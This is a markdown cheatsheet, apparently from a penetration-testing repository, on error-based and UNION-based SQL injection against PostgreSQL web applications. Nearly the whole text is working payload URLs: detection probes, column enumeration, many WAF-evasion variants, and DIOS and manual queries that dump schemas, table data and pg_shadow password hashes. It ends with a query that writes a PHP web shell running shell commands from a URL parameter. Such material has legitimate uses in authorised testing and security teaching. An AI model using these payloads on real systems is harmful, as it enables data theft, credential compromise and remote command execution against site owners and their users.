# PostgreSQL Error Based SQL Injection Cheatsheet
This is probably the easiest vulnerability along the SQL Injection attack. An attacker can enumerate and dump the PostgreSQL database by using the SQL error messages to his advantage.

## Detecting the vulnerability

```http://domain.com/index.php?id=1 ```  
Website loads normally

```http://domain.com/index.php?id=1'```  
Error shows up: pg_query(): ```Query failed: ERROR: unterminated quoted string at or near...```

```http://domain.com/index.php?id=1\'```  
Error message shows up again

```http://domain.com/index.php?id=-1)'```  
Error message shows up again

```http://domain.com/index.php?id=1'--```  
Website might loads successfuly, but it might shows error also

```http://domain.com/index.php?id=1'--```  
Website might loads successfuly, but it might shows error also

```http://domain.com/index.php?id=1+--```  
Website might loads successfuly, but it might shows error also

## Retrieving information from database (UNION based query)
### Find the number of columns using 'ORDER BY' query

Now that we performed an SQL syntax error to the website, we can begin fuzzing and finding how many columns do we have by using **ORDER BY** query.

```http://domain.com/index.php?id=1' order by 1--```  
This query musn't shows up error, since there is no lower number than 1

  - If the payload shows up error, try setting a negative value:
  ```http://domain.com/index.php?id=-1' order by 1--```  
  This query musn't shows up error, since there is no lower number than 1  
  
    - If the payload shows up error, try removing the quote which might cause SQL error:   
    ```http://domain.com/index.php?id=1 order by 1--```  
    ```http://domain.com/index.php?id=-1 order by 1--```  
    These both queries musn't shows up error.
    
    - If none of payload's didn't work, try the following one:  
    ```http://domain.com/index.php?id=1 GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100```
    
    - The last option is to use a Boolean based payload:  
    ```http://domain.com/index.php?id=1 and true order by 1-- -```  
    The given query musn't show up error.
    
    Look at the error and search which number reflects.  
    
    Example:  
    >Query failed: ERROR: the position **4** in GROUP_BY...   
    
    From the error message, the 4th column is being reflected, which means we can dump that. Now move to the next step.
    
      - If none of payloads didn't work, it is problably a WAF blocking it. Try the following blocks until you won't see WAF detection or SQL syntax error.
      ```http://domain.com/index.php?id=1' order by 1 desc-- -``` 
      ```http://domain.com/index.php?id=1' group by 1-- -```  
      ```http://domain.com/index.php?id=1' group by 1-- -```  
      ```http://domain.com/index.php?id=1' /**/ORDER/**/BY/**/ 1-- -```  
      ```http://domain.com/index.php?id=-1' /*!order*/+/*!by*/ 1-- -```  
      ```http://domain.com/index.php?id=1' /*!ORDER BY*/ 1-- -```  
      ```http://domain.com/index.php?id=1'/*!50000ORDER*//**//*!50000BY*/ 1-- -```  
      ```http://domain.com/index.php?id=1' /*!12345ORDER*/+/*!BY*/ 1-- -```  
      ```http://domain.com/index.php?id=1' /*!50000ORDER BY*/ 1-- -```  
      ```http://domain.com/index.php?id=1' order/**_**/by 1-- -```  
      ```http://domain.com/index.php?id=1\ order by 1-- -```  
      ```http://domain.com/index.php?id=1' order by 1 asc-- -```  
      ```http://domain.com/index.php?id=1' group by 1 asc-- -```  
      ```http://domain.com/index.php?id=1' AND 0 order by 1-- -```
      
        - If none of the payloads didn't bypass WAF, try again the payloads by following the 2 rules below:

          Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
          Remove the quote (') after the parameter value (example: ```?id=1 /**/ORDER/**/BY/**/ 1-- -```)

In this case, the payload ```?id=1 order by 1-- -``` worked and website loads successfuly. Now it is time to find the correct number of columns. Now let's use the payload that worked, and try increasing the number by 1, untill an error shows up:

```http://domain.com/index.php?id=1 order by 1``` no error  
```http://domain.com/index.php?id=1 order by 2``` no error  
```http://domain.com/index.php?id=1 order by 3``` no error  
```http://domain.com/index.php?id=1 order by 4``` no error  
```http://domain.com/index.php?id=1 order by 5``` error: Query failed: ERROR:...  

This means there are only 4 columns. Now we have to find which one of these 4 columns is vulnerable.

*NOTE: If none worked, try the same payloads, but remove the quote (') after number 1.*

Website must successfully load and we will see a number (in our case between 1-4)

### Dump the vulnerable column

Usually on PostgreSQL, server doesn't accept numbers on the query, so we have to use characters instead.

```http://domain.com/index.php?id=1 union select CHR(49) || CHR(50) || CHR(51) || CHR(52)```  if no error, look for what number is shown  
```http://domain.com/index.php?id=1 union select null,null,null,null```  
```http://domain.com/index.php?id=1 union select version(),null,null,null``` if no error, then the first column is vulnerable  
```http://domain.com/index.php?id=1 union select null,version(),null,null``` if no error, then the second column is vulnerable  
```http://domain.com/index.php?id=1 union select null,null,version(),null``` if no error, then the third column is vulnerable  
```http://domain.com/index.php?id=1 union select null,null,null,version()``` if no error, then the fourth column is vulnerable  

More payloads with UNION based query:
```
http://domain.com/index.php?id=1 Union Select null,null,null,null
http://domain.com/index.php?id=-1 Union Select null,null,null,null
http://domain.com/index.php?id=-1 Union Select null,null,null,null
http://domain.com/index.php?id=1+UNION+ALL+SELECT+null,null,null,null
http://domain.com/index.php?id=1 Union Select null,null,null,null
http://domain.com/index.php?id=.1 Union Select null,null,null,null
http://domain.com/index.php?id=-1 div 0 Union Select null,null,null,null
http://domain.com/index.php?id=1 Union Select null,null,null,null desc
http://domain.com/index.php?id=1 AND 0 Union Select null,null,null,null
```

If the queries are blocked by WAF, try the following payloads:  

```
http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,null,null,null  
http://domain.com/index.php?id=1 %55nion(%53elect 1,2,3) null,null,null,null  
http://domain.com/index.php?id=1+union+distinctROW+select+null,null,null,null--+-  
http://domain.com/index.php?id=1+ #?uNiOn + #?sEleCt null,null,null,null  
http://domain.com/index.php?id=1 + #?1q %0AuNiOn all#qa%0A#%0AsEleCt null,null,null,null  
http://domain.com/index.php?id=1 /*!%55NiOn*/ /*!%53eLEct*/ null,null,null,null  
http://domain.com/index.php?id=1 +un/**/ion+se/**/lect null,null,null,null  
http://domain.com/index.php?id=1 +?UnI?On?+'SeL?ECT? null,null,null,null  
http://domain.com/index.php?id=1+(UnIoN)+(SelECT)+null,null,null,null--+-  
http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null  
http://domain.com/index.php?id=1 %55nion(%53elect null,null,null,null)
http://domain.com/index.php?id=1 /**//*!12345UNION SELECT*//**/ null,null,null,null  
http://domain.com/index.php?id=1 /**//*!50000UNION SELECT*//**/ null,null,null,null  
http://domain.com/index.php?id=1 /**/UNION/**//*!50000SELECT*//**/ null,null,null,null  
http://domain.com/index.php?id=1 /*!50000UniON SeLeCt*/ null,null,null,null  
http://domain.com/index.php?id=1 union /*!50000%53elect*/ null,null,null,null  
http://domain.com/index.php?id=1 /*!u%6eion*/ /*!se%6cect*/ null,null,null,null  
http://domain.com/index.php?id=1 /*--*/union/*--*/select/*--*/ null,null,null,null  
http://domain.com/index.php?id=1 union (/*!/**/ SeleCT */ null,null,null,null)
http://domain.com/index.php?id=1 /*!union*/+/*!select*/ null,null,null,null  
http://domain.com/index.php?id=1 /**/uNIon/**/sEleCt/**/ null,null,null,null  
http://domain.com/index.php?id=1 +%2F**/+Union/*!select*/ null,null,null,null  
http://domain.com/index.php?id=1 /**//*!union*//**//*!select*//**/ null,null,null,null  
http://domain.com/index.php?id=1 /*!uNIOn*/ /*!SelECt*/ null,null,null,null  
http://domain.com/index.php?id=1 /**/union/*!50000select*//**/ null,null,null,null  
http://domain.com/index.php?id=1 0%a0union%a0select%09 null,null,null,null  
http://domain.com/index.php?id=1 %0Aunion%0Aselect%0A null,null,null,null  
http://domain.com/index.php?id=1 uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ null,null,null,null  
http://domain.com/index.php?id=1 %252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ null,null,null,null  
http://domain.com/index.php?id=1 /*!union*//*--*//*!all*//*--*//*!select*/ null,null,null,null  
http://domain.com/index.php?id=1 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C null,null,null,null
http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ null,null,null,null  
http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null  
http://domain.com/index.php?id=1 union+sel%0bect null,null,null,null  
http://domain.com/index.php?id=1 +#1q%0Aunion all#qa%0A#%0Aselect null,null,null,null  
http://domain.com/index.php?id=1 %23xyz%0AUnIOn%23xyz%0ASeLecT+ null,null,null,null  
http://domain.com/index.php?id=1 %23xyz%0A%55nIOn%23xyz%0A%53eLecT+ null,null,null,null  
http://domain.com/index.php?id=1 union(select(null),null,null)
http://domain.com/index.php?id=1 uNioN (/*!/**/ SeleCT */ 11) null,null,null,null  
http://domain.com/index.php?id=1 /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ null,null,null,null  
http://domain.com/index.php?id=1 %0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ null,null,null,null  
http://domain.com/index.php?id=1 +union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C null,null,null,null  
http://domain.com/index.php?id=1 /*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ null,null,null,null  
http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null  
http://domain.com/index.php?id=1 +/*!UnIoN*/+/*!SeLeCt*/+ null,null,null,null  
http://domain.com/index.php?id=1 /*!u%6eion*/ /*!se%6cect*/ null,null,null,null  
http://domain.com/index.php?id=1 uni%20union%20/*!select*/%20 null,null,null,null  
http://domain.com/index.php?id=1 union%23aa%0Aselect null,null,null,null  
http://domain.com/index.php?id=1/**/union/*!50000select*/ null,null,null,null  
http://domain.com/index.php?id=1 /^****union.*$/ /^****select.*$/ null,null,null,null  
http://domain.com/index.php?id=1 /*union*/union/*select*/select+ null,null,null,null  
http://domain.com/index.php?id=1 /*!50000UnION*//*!50000SeLeCt*/ null,null,null,null  
http://domain.com/index.php?id=1 %252f%252a*/union%252f%252a /select%252f%252a*/ null,null,null,null  
http://domain.com/index.php?id=1 AnD null UNiON SeLeCt null,null,null,null;%00 
http://domain.com/index.php?id=1 AnD null UNiON SeLeCt null,null,null,null+--+-  
http://domain.com/index.php?id=1 And False Union Select null,null,null,null+--+-  
```  

In this case the 2nd column was vulnerable, so let's retrieve information from this column.  
Both payloads below will print the version of Database.

```http://domain.com/index.php?id=1 union select null,cast(version() as int),null,null```   
```http://domain.com/index.php?id=1 union select null,cast(version() as numeric),null,null```  

Look at the error message, we will retrieve the version of the database:  
>Query failed: ERROR: The syntax you enter contains an invalid number: "PostgreSQL 9.2.2, compiled by Visaul C++ build 1600, 64bit", in D:\AppServer\www\...  

Try forcing server to reflect your input:  
```http://domain.com/index.php?id=1 Union Select null,cast(CHR(107) || CHR(108) || CHR(101) || CHR(105) || CHR(116) || CHR(111) || CHR(110) || CHR(48) || CHR(120) || CHR(48) || CHR(48) as int),null,null```  
On the error message, you will see your input reflected (this case **kleiton0x00**)

Retrieve the database name:  
```http://domain.com/index.php?id=1 union select null,cast(current_database() as int),null,null```  
Inside the error message, the user will be displayed: 
>Query failed: ERROR: invalid input syntax for integer: **"munivent_database"** in /home/REDACTED/public_html/index.php on line...  

Search for table:  
```http://domain.com/index.php?id=1 union select null,cast(current_user as int),null,null```  
Inside the error message, the user will be displayed:  
>Query failed: ERROR: invalid input syntax for integer: **"admin_user"** in /home/REDACTED/public_html/index.php on line...  

Retrieving multiple information:  
```http://domain.com/index.php?id=1 and union select null,cast(current_database() ||":"|| current_user ||":"|| version() as int),null,null```  
Inside the error message, the information will be displayed:  
>Query failed: ERROR: invalid input syntax for integer: **"munivent_database : admin_user : munivent_database : PostgreSQL 9.2.24 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit"** in /home/REDACTED/public_html/index.php on line...  

## Retrieving information from database (Boolean string)

In the second method, we don't need to enumerate the number of columns. We directly begin retrieving information, however it is harder to guess the table names and columns.

```http://domain.com/index.php?1 and 1=cast(version() as int)```  
Inside the error message, the version will be displayed:  
>Query failed: ERROR: invalid input syntax for integer: **"PostgreSQL 9.2.24 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit"** in /home/REDACTED/public_html/index.php on line...

Retrieve the database name:  
```http://domain.com/index.php?id=1 and 1=cast(current_database() as int)```  
Inside the error message, the user will be displayed: 
>Query failed: ERROR: invalid input syntax for integer: **"munivent_database"** in /home/REDACTED/public_html/index.php on line...

Search for table:  
```http://domain.com/index.php?id=1 and 1=cast(current_user as int)```  
Inside the error message, the user will be displayed:  
>Query failed: ERROR: invalid input syntax for integer: **"admin_user"** in /home/REDACTED/public_html/index.php on line...  

Try forcing server to reflect your input:  
```http://domain.com/index.php?id=1 and 1=cast(and 1=cast( CHR(107) || CHR(108) || CHR(101) || CHR(105) || CHR(116) || CHR(111) || CHR(110) || CHR(48) || CHR(120) || CHR(48) || CHR(48) as int)```  
Inside the error message, the input will be reflected:  
>Query failed: ERROR: invalid input syntax for integer: **"kleiton0x00"** in /home/REDACTED/public_html/index.php on line...  

Retrieving multiple information:  
```http://domain.com/index.php?id=1 and 1=cast(current_database() ||":"|| current_user ||":"|| version() as int)```  
Inside the error message, the information will be displayed:  
>Query failed: ERROR: invalid input syntax for integer: **"munivent_database : admin_user : munivent_database : PostgreSQL 9.2.24 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit"** in /home/REDACTED/public_html/index.php on line...  

## Retrieve data with DIOS payload

- For Postgre 8.4
```
(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))
```
- For Postgre 9.1
```
(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))
```
3. All versions
```
(select+array_to_string(array(select+table_name||':::'||column_nam e::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))
```  
```
'Makman ::: '||version()||'<br>'||(SELECT array_to_string(array(SELECT ('===>'||table_name||' :: '||column_name)::text FROM information_schema.columns where table_schema='public'),'<br>')) 
```

### How to use DIOS payload?

Copy the UNION based payload which shows the vulnerable column, in my case this payload worked:  
```http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,null,null,null```

Because the vulnerable column was **2**, simply replace the second *null* with the DIOS payload:  
```http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,(select+array_to_string(array(select+table_name||':::'||column_nam e::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E')),null,null```

## Manually dumping  
DIOS are complex queries and sometime they leads to errors, so using simpler queries to do specific dumping (like tables or columns) might be a better idea.

### Dump database names
```'+union+select+cast(datname+as+int),null,null,null,null,null++FROM+pg_database--```  
or without casting to int:  
```'+union+select+datname,null,null,null,null,null++FROM+pg_database--```

### Dump tables
Let's assume that there are 4 columns in total and the first column is vulnerable. The following query can be used to dump all the tables:  
```' union select cast(table_name as int), null, null, null FROM information_schema.tables--```  
or without casting to int:  
```' union select table_name, null, null, null FROM information_schema.tables--```  

Another query to dump tables via **ARRAY_AGG** function (thanks [@Nikhil](https://github.com/0xw0lf) for the query):  
```-1 ' UNION ALL SELECT NULL,ARRAY_AGG(COALESCE(tablename::text,' '))::text,NULL,NULL,NULL FROM pg_tables WHERE schemaname IN ('<database>')--```

### Dump columns  
You can only dump columns table per table (unless if you use DIOS which shows every columns of every table). In this case, we want to dump the columns of a table named **users**:  
```union select cast(column_name as int), null, null, null FROM information_schema.columns WHERE table_name='users'--+```  
or without casting to int:  
```union select column_name, null, null, null FROM information_schema.columns WHERE table_name='users'--+```  

If none of the mentioned queries worked, try dumping with **ARRAY_AGG** function (thanks [@Nikhil](https://github.com/0xw0lf) for the query):  
```-1' UNION ALL SELECT NULL,NULL,ARRAY_AGG(COALESCE(attname::text,(CHR(32))))::text,NULL,NULL FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='<table>' AND nspname='<database>'--```

### Dump data  
Assume that inside table **users** there is a column called **password**, let's dump that column:  
```' union select cast(data_column as int), null, null, null FROM password--+```  
or without casting to int:  
```' union select data_column, null, null, null FROM password--+```  

Another query to dump data via **ARRAY_AGG** function (thanks [@Nikhil](https://github.com/0xw0lf) for the query):  
```1' UNION ALL SELECT NULL,ARRAY_AGG(COALESCE(name::text,(' ')))::text,NULL,NULL,NULL FROM <database>.<table> ORDER BY <column>--```  
For example:  
```1' UNION ALL SELECT NULL,ARRAY_AGG(COALESCE(name::text,(' ')))::text,NULL,NULL,NULL FROM public.users ORDER BY name--```

### Dump PostgreSQL user's username & password hash  
Let's assume that the database has 5 columns and the first one is vulnerable.   

Dump postgres username:  
```'+union+select+cast(usename+as+int),null,null,null,null++FROM+pg_shadow--```  
If that doesn't work, try the same query without doing the casting to int:  
```http://website.com/products/detail?id=-1' union select usename,null,null,null,null from pg_shadow--```  

Dump postgres user's password:  
```'+union+select+cast(passwd+as+int),null,null,null,null++FROM+pg_shadow--```  
If that doesn't work, try the same query without doing the casting to int:   
```http://website.com/products/detail?id=-1' union select passwd,null,null,null,null from pg_shadow--```  

### Write file (Webshell)

```UNION SELECT '<?php $out = shell_exec($_GET["x"]); echo "<pre>$out</pre>";?>' \g /var/www/test.php; --```
